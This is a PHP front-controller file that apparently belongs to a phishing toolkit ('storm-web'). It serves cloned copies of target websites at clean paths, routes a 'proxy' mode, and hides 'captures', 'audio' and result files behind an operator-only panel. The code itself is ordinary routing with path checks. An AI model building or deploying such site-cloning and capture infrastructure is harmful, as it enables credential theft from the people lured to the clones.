<?php
/**
 * router.php — front-controller that lets cloned targets live at clean
 * top-level paths instead of `targets/<slug>/index.html`.
 *
 *   /                     → index.php (panel or login redirect)
 *   /<slug>               → targets/<slug>/index.html
 *   /<slug>/              → targets/<slug>/index.html
 *   /<slug>/assets/<f>    → targets/<slug>/assets/<f>   (whitelisted)
 *   /<known panel file>   → served normally by the web server
 *   anything else         → 404
 *
 * The router never serves a target's captures/, audio/, result.txt, or
 * meta.json — those are operator-only and stay behind the panel.
 *
 * Usage:
 *   - PHP built-in dev server:  php -S host:port -t storm-web/ router.php
 *     (run-local.php passes this in.)
 *   - Apache:                   .htaccess rewrites unknown paths to router.php
 *   - Nginx:                    try_files $uri $uri/ /router.php;
 */

require_once __DIR__ . '/lib/cloner.php';
require_once __DIR__ . '/lib/store.php';

$docroot      = __DIR__;
$targets_root = $docroot . '/targets';

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?? '/';
$path = '/' . ltrim($path, '/');

/* ------------------------------------------------------------------ *
 *  1.  Existing files — let the server / built-in handler serve them.
 * ------------------------------------------------------------------ */

$abs = realpath($docroot . $path);
if ($abs !== false
    && str_starts_with($abs, $docroot . DIRECTORY_SEPARATOR)
    && is_file($abs)
    && !str_starts_with($abs, $docroot . DIRECTORY_SEPARATOR . 'data' . DIRECTORY_SEPARATOR)
) {
    // Built-in PHP server: returning false means "serve the static file".
    if (PHP_SAPI === 'cli-server') return false;

    // Apache/Nginx fallback: stream it ourselves with a sensible MIME.
    router_serve_file($abs);
    exit;
}

/* ------------------------------------------------------------------ *
 *  2.  Bare root — defer to index.php.
 * ------------------------------------------------------------------ */

if ($path === '/' || $path === '') {
    require $docroot . '/index.php';
    exit;
}

/* ------------------------------------------------------------------ *
 *  3.  /<slug>  or  /<slug>/<sub-path>   →  cloned target.
 * ------------------------------------------------------------------ */

$parts = array_values(array_filter(explode('/', $path), fn($p) => $p !== ''));
$slug  = strtolower($parts[0] ?? '');
$rest  = array_slice($parts, 1);

if ($slug !== '' && cloner_valid_slug($slug)) {
    // Check if this is a proxy-mode target
    if (count($rest) >= 1 && $rest[0] === 'proxy') {
        $target = store_target_get($slug);
        if ($target !== null && ($target['mode'] ?? 'clone') === 'proxy') {
            require_once __DIR__ . '/lib/proxy.php';
            $sub_path = implode('/', array_slice($rest, 1));
            proxy_handle($slug, $sub_path, $target);
            exit;
        }
    }

    // For proxy-mode targets, bare /<slug> redirects to /<slug>/proxy/
    $target_check = store_target_get($slug);
    if ($target_check !== null && ($target_check['mode'] ?? 'clone') === 'proxy') {
        if (count($rest) === 0) {
            header('Location: /' . $slug . '/proxy/', true, 302);
            exit;
        }
    }

    $target_dir = $targets_root . '/' . $slug;
    if (is_dir($target_dir)) {
        // /<slug>  or  /<slug>/  →  index.html
        if (count($rest) === 0) {
            $index = $target_dir . '/index.html';
            if (is_file($index)) {
                router_serve_file($index);
                exit;
            }
        }

        // /<slug>/assets/<file>  →  the cloned page's downloaded assets.
        if (count($rest) >= 2 && $rest[0] === 'assets') {
            $sub      = implode('/', array_slice($rest, 1));
            $asset    = $target_dir . '/assets/' . $sub;
            $real     = realpath($asset);
            $expected = realpath($target_dir . '/assets');
            if ($real !== false
                && $expected !== false
                && str_starts_with($real, $expected . DIRECTORY_SEPARATOR)
                && is_file($real)
            ) {
                router_serve_file($real);
                exit;
            }
        }

        // captures/, audio/, result.txt, meta.json — operator-only.
        // Anything else under /<slug>/ → 404.
        http_response_code(404);
        exit;
    }
}

/* ------------------------------------------------------------------ *
 *  4.  Nothing matched.
 * ------------------------------------------------------------------ */

http_response_code(404);
echo "404 Not Found";
exit;


/* ------------------------------------------------------------------ *
 *  Helpers
 * ------------------------------------------------------------------ */

/** Stream a file with a content-type chosen by extension. */
function router_serve_file(string $path): void {
    $ext  = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $mime = router_mime_for($ext);
    header('Content-Type: ' . $mime);
    header('Content-Length: ' . filesize($path));
    header('X-Content-Type-Options: nosniff');
    readfile($path);
}

function router_mime_for(string $ext): string {
    static $map = [
        'html' => 'text/html; charset=utf-8',
        'htm'  => 'text/html; charset=utf-8',
        'css'  => 'text/css; charset=utf-8',
        'js'   => 'application/javascript; charset=utf-8',
        'mjs'  => 'application/javascript; charset=utf-8',
        'json' => 'application/json; charset=utf-8',
        'svg'  => 'image/svg+xml',
        'png'  => 'image/png',
        'jpg'  => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif'  => 'image/gif',
        'webp' => 'image/webp',
        'ico'  => 'image/x-icon',
        'woff' => 'font/woff',
        'woff2'=> 'font/woff2',
        'ttf'  => 'font/ttf',
        'otf'  => 'font/otf',
        'txt'  => 'text/plain; charset=utf-8',
    ];
    return $map[$ext] ?? 'application/octet-stream';
}
